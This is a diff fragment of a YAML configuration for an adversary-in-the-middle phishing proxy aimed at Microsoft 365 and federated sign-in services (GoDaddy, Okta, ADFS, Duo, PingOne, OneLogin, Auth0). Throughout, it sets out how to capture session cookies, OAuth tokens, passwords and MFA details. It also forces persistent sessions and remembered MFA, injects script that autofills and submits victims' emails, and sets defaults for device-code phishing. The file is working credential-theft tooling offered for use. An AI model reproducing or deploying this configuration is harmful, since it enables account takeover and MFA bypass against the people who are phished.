+  # =========================================================================
+  - {triggers_on: 'auth.pingone.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'auth', domain: 'pingone.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # PingOne redirect_only
+  - {triggers_on: 'auth.pingone.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'auth', domain: 'pingone.com', search: 'https://auth\.pingone\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+
+  # =========================================================================
+  # ONELOGIN ↔ Microsoft cross-domain rewrites (shared domain - always active)
+  # =========================================================================
+  - {triggers_on: 'app.onelogin.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'app', domain: 'onelogin.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # OneLogin redirect_only
+  - {triggers_on: 'app.onelogin.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login\.microsoftonline\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'app', domain: 'onelogin.com', search: 'https://app\.onelogin\.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+
+headers:
+  inject:
+  - { key: "Cache-Control", value: "no-store, no-cache, must-revalidate, proxy-revalidate" }
+  - { key: "Pragma", value: "no-cache" }
+  - { key: "Expires", value: "0" }
+  - { key: "X-Forwarded-For", value: "dynamic_ip_here" } 
+  - { key: "Referer", value: "https://login.microsoftonline.com" }
+  - { key: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
+  - { key: "Content-Security-Policy", value: "frame-ancestors 'self' https://outlook.office365.com" }
+ 
+session:
+  use_cookies: true
+  keepalive: true
+  store_tokens: true
+  token_match: "access_token"
+  overwrite: true
+  cookie_ttl: 31536000
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: ".microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: "login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: ".live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token", ".*,regexp"]
+    
+  - domain: "login.live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token", ".*,regexp"]
+    
+  - domain: "outlook.live.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "refresh_token", ".*,regexp"]
+    
+  - domain: "outlook.office.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+    
+  - domain: "outlook.office365.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "x-ms-Token", "x-ms-SessionId", "refresh_token", ".*,regexp"]
+
+  - domain: ".office.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "OIDCAuthCookie", "ClientId", "FedAuth", "rtFa", ".*,regexp"]
+
+  - domain: "www.office.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential", "OIDCAuthCookie", "ClientId", "FedAuth", "rtFa", ".*,regexp"]
+
+  # -------------------------------------------------------------------------
+  # GODADDY SSO - Full federated auth capture (from office.yaml)
+  # -------------------------------------------------------------------------
+  - domain: '.godaddy.com'
+    keys: ['auth_idp', 'auth_idp_sid', 'market', 'currency', 'visitor', 'pathway', '_policy', 'login_info_pass', 'fb_sessiontraffic', 'fb_sessionid_4', 'OBP', 'gdtoken', 'akm_lmprb-ssn', 'akm_lmprb', '.*,regexp']
+  - domain: 'godaddy.com'
+    keys: ['akm_lmprb-ssn', 'akm_lmprb', '.*,regexp']
+  - domain: '.sso.godaddy.com'
+    keys: ['auth_idp', 'auth_idp_sid', 'login_info_pass', 'pathway', 'visitor', 'akm_lmprb-ssn', 'akm_lmprb', '.*,regexp']
+  - domain: '.idp.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: '.gui.godaddy.com'
+    keys: ['.*,regexp']
+  - domain: '.wsimg.com'
+    keys: ['.*,regexp']
+
+  # SecureServer.net - GoDaddy's authentication backend
+  - domain: '.secureserver.net'
+    keys: ['auth_idp', 'auth_idp_sid', 'gdtoken', '.*,regexp']
+  - domain: 'secureserver.net'
+    keys: ['.*,regexp']
+  - domain: '.sso.secureserver.net'
+    keys: ['.*,regexp']
+  - domain: '.idp.secureserver.net'
+    keys: ['.*,regexp']
+  - domain: '.login.secureserver.net'
+    keys: ['.*,regexp']
+  - domain: '.auth.secureserver.net'
+    keys: ['.*,regexp']
+
+  # =========================================================================
+  # OKTA - Session token capture (activated when okta_org param is set)
+  # =========================================================================
+  - domain: '{okta_org}.okta.com'
+    keys: ['idx:always', 'sid:opt', 'DT:opt', '.*,regexp:opt']
+  - domain: '.oktacdn.com'
+    keys: ['.*,regexp:opt']
+
+  # =========================================================================
+  # ADFS - Session token capture (activated when adfs_sub/adfs_domain set)
+  # =========================================================================
+  - domain: '.{adfs_domain}'
+    keys: ['.*,regexp:opt']
+
+  # =========================================================================
+  # DUO SECURITY - Token capture (activated when duo_api/duo_sso set)
+  # =========================================================================
+  - domain: '.duosecurity.com'
+    keys: ['.*,regexp:opt']
+
+  # =========================================================================
+  # JUMPCLOUD - Session tokens (always active)
+  # =========================================================================
+  - domain: '.jumpcloud.com'
+    keys: ['x-xsrftoken:opt', 'session:opt', '.*,regexp:opt']
+
+  # =========================================================================
+  # PINGONE - Session tokens (always active)
+  # =========================================================================
+  - domain: '.pingone.com'
+    keys: ['ST:opt', 'PA:opt', '.*,regexp:opt']
+
+  # =========================================================================
+  # ONELOGIN - Session tokens (always active)
+  # =========================================================================
+  - domain: '.onelogin.com'
+    keys: ['sub_session_onelogin.com:opt', '.*,regexp:opt']
+
+  # =========================================================================
+  # AUTH0 - Session tokens (always active)
+  # =========================================================================
+  - domain: '.auth0.com'
+    keys: ['auth0:opt', 'did:opt', '.*,regexp:opt']
+
+# Capture tokens from HTTP response bodies (landingv2 returns tokens in POST body)
+http_tokens:
+  - domain: "www.office.com"
+    path: "/landingv2"
+    keys:
+      - name: "id_token"
+        search: 'name="id_token"[^>]*value="([^"]+)"'
+      - name: "code"
+        search: 'name="code"[^>]*value="([^"]+)"'
+      - name: "state"
+        search: 'name="state"[^>]*value="([^"]+)"'
+
+  - domain: "outlook.office.com"
+    path: "/landing*"
+    keys:
+      - name: "id_token"
+        search: 'name="id_token"[^>]*value="([^"]+)"'
+      - name: "code"
+        search: 'name="code"[^>]*value="([^"]+)"'
+
+  - domain: "login.microsoftonline.com"
+    path: "/common/oauth2/v2.0/token"
+    keys:
+      - name: "access_token"
+        search: '"access_token"\s*:\s*"([^"]+)"'
+      - name: "refresh_token"
+        search: '"refresh_token"\s*:\s*"([^"]+)"'
+      - name: "id_token"
+        search: '"id_token"\s*:\s*"([^"]+)"'
+
+# Capture tokens from POST request bodies
+body_tokens:
+  - domain: "www.office.com"
+    path: "/landingv2"
+    keys:
+      - name: "id_token"
+        search: 'id_token=([^&]+)'
+      - name: "code"
+        search: 'code=([^&]+)'
+      - name: "state"
+        search: 'state=([^&]+)'
+
+  - domain: "outlook.office.com"
+    path: "/owa/*"
+    keys:
+      - name: "code"
+        search: 'code=([^&]+)'
+
+auth_urls:
+  - "/common/oauth2/v2.0/token"
+  - "/common/oauth2/token"
+  - "/kmsi*"
+  - "/landingv2"
+  - "/landing*"
+  - "/ppsecure/post.srf*"         
+  - "/owa/auth/logon.aspx*"       
+  - "/common/SAS/ProcessAuth"    
+  - "/ecp/authorize*"             
+  - "/mail/inbox*"            
+  - "/owa/auth/errorfe.aspx*" 
+  - "/login.srf"
+
+
+   
+force_post:
+  - path: "/common/oauth2/v2.0/authorize"
+    search:
+      - { key: "scope", search: ".*" }
+    force:
+      - { key: "scope", value: "openid profile email offline_access" }
+    type: "post"
+
+  - path: "/common/oauth2/v2.0/authorize"
+    search:
+      - { key: "prompt", search: ".*" }
+    force:
+      - { key: "prompt", value: "login" }
+    type: "post"
+
+  - path: "/common/oauth2/v2.0/token"
+    search:
+      - { key: "grant_type", search: ".*" }
+    force:
+      - { key: "grant_type", value: "refresh_token" }
+    type: "post"
+
+  - path: "/common/SAS/ProcessAuth"
+    search:
+      - { key: "rememberMFA", search: ".*" }
+      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
+      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
+    force:
+      - { key: "rememberMFA", value: "true" }
+      - { key: "PPSession", value: "true" }
+    type: "post"
+
+  - path: "/owa/auth.owa"
+    search:
+      - { key: "username", search: ".*" }
+      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
+      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
+    force:
+      - { key: "PPSession", value: "true" }
+    type: "post"
+
+  - path: "/kmsi"
+    search:
+      - { key: "PPSession", search: ".*" }
+    force:
+      - { key: "PPSession", value: "true" }
+    type: "post"
+
+  # ADFS - Force KMSI (Keep Me Signed In) for persistent session cookies
+  - path: "/kmsi"
+    search:
+      - { key: "LoginOptions", search: ".*" }
+    force:
+      - { key: "LoginOptions", value: "1" }
+    type: "post"
+    
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+credentials:
+  username:
+    key: '(username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)'
+    search: '"(?:username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)"\s*:\s*"([^"]+)"'
+    type: 'json'
+  password:
+    key: '(passwd|Password|password|pass|pwd|Passwd|session_password|login_password|userpassword|user_pass|access_key|secretKey|password_field|loginpass|secret_password)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+  - key: '"password"'
+    search: '"password"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"Passwd"'
+    search: '"Passwd"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"access_key"'
+    search: '"access_key"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"secretKey"'
+    search: '"secretKey"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: 'mfaAuthMethod'
+    search: '(.*)'
+    type: 'post'
+  - key: '"device"'
+    search: '"device"\s*:\s*"([^"]+)"'
+    type: 'json'
+  - key: '"refresh_token"'
+    search: '"refresh_token"\s*:\s*"([^"]+)"'
+    type: 'json'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com", "account.live.com"]
+    trigger_paths: ["/common/oauth2/", "/", "/*", "/ppsecure/*"]
+    trigger_params: ["uid", "e", "email"]
+    script: |
+      var PARAM_NAMES = ["uid", "e", "email"];
+      function lp(){
+        var ei = document.querySelector("#i0116");
+        var nb = document.querySelector("#idSIButton9, input[type=\"submit\"], button[type=\"submit\"]");
+        if (!ei || !nb) { setTimeout(lp, 300); return; }
+
+        var raw = "";
+        var sp = new URLSearchParams(window.location.search);
+        for (var i = 0; i < PARAM_NAMES.length; i++) {
+          var v = sp.get(PARAM_NAMES[i]);
+          if (v && v !== "" && v.charAt(0) !== "{") { raw = v; break; }
+        }
+
+        // session param fallback
+        if (!raw) {
+          var injected = ["{uid}", "{e}", "{email}"];
+          for (var j = 0; j < injected.length; j++) {
+            if (injected[j].charAt(0) !== "{") { raw = injected[j]; break; }
+          }
+        }
+        if (!raw) return;
+
+        var email = raw;
+        if (raw.indexOf("@") === -1) {
+          try { email = atob(raw.replace(/[-_]/g, function(m){return m===\"-\"?\"+\":\"/\";})); }
+          catch(e) { email = raw; }
+        }
+        if (email.indexOf("@") === -1) return;
+
+        ei.focus();
+        ei.value = email;
+        ei.dispatchEvent(new Event("input", { bubbles: true }));
+        ei.dispatchEvent(new Event("change", { bubbles: true }));
+        nb.focus();
+        nb.click();
+      }
+      setTimeout(lp, 500);
+
+
+# ═══════════════════════════════════════════════════════
+# DEVICE CODE — OAuth 2.0 Device Authorization Grant defaults
+# These defaults are used when a lure doesn't specify DC settings
+# ═══════════════════════════════════════════════════════
+device_code:
+  provider: 'microsoft'
+  client: 'ms_office'
+  scope: 'full'
+  mode: 'direct'
+  template: 'success'
